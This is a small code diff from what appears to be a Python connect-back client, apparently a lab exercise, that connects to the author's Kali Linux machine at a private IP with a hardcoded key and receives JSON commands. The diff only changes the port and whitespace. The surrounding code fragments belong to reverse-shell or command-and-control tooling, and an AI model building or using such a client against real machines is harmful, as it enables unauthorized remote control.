@@ -24,7 +24,7 @@ SERVER_PORT = args.port
 '''
 # Step 1: Use explicit SERVER_IP and SERVER_PORT make create a connection 
 SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
-SERVER_PORT = 8887
+SERVER_PORT = 8888
 '''
 #Step 4: Authentication
 key = b'\x91)\xdd\xa9\x06\xaa\x8d\xb2\xbd\x7fY\x84! \x99\xcb'
@@ -60,7 +60,7 @@ def send(data):
     client_sock.send(json_data.encode('utf-8'))
 
 
-def recv_command():
+def recv_command(): 
     data = client_sock.recv(4096).decode('utf-8')  # Increased buffer size for safety
     try:
         message = json.loads(data)
